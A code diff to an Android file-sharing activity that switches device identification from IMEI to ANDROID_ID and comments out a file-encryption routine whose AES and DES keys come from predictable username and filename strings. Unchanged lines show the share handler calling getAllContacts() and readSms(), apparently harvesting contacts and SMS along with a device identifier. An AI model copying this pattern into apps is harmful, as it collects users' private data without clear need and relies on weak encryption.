@@ -14,6 +14,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
 import android.provider.OpenableColumns;
+import android.provider.Settings;
 import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
@@ -112,12 +113,13 @@ public class ShareFile extends AppCompatActivity {
 
 
 
-        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+//        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 //        if (ActivityCompat.checkSelfPermission(ShareFile.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
 //            ActivityCompat.requestPermissions(ShareFile.this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_CODE);
 //            return;
 //        }
-        IMEINumber = telephonyManager.getDeviceId();
+//        IMEINumber = telephonyManager.getDeviceId();
+        IMEINumber = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 //        textView.setText(IMEINumber);
 
     }
@@ -210,7 +212,7 @@ public class ShareFile extends AppCompatActivity {
                     String myurl;
                     myurl = uri1.toString();
 
-                    showKeyDialog(file);
+//                    showKeyDialog(file);
 
                     getAllContacts();
                     readSms();
@@ -252,13 +254,13 @@ public class ShareFile extends AppCompatActivity {
     }
 
 
-    private void showKeyDialog(File file) {
-        String keyAES = "AES" + username + filename;
-        String keyDES = "DES" + username + filename;
-
-        MyEncryptionClass.encryptionAES(file, keyAES);
-        MyEncryptionClass.encryptionDES(file, keyDES);
-    }
+//    private void showKeyDialog(File file) {
+//        String keyAES = "AES" + username + filename;
+//        String keyDES = "DES" + username + filename;
+//
+//        MyEncryptionClass.encryptionAES(file, keyAES);
+//        MyEncryptionClass.encryptionDES(file, keyDES);
+//    }
 
     private void decryptDialog(File file) {
         String keyAES = "AES" + username + filename;
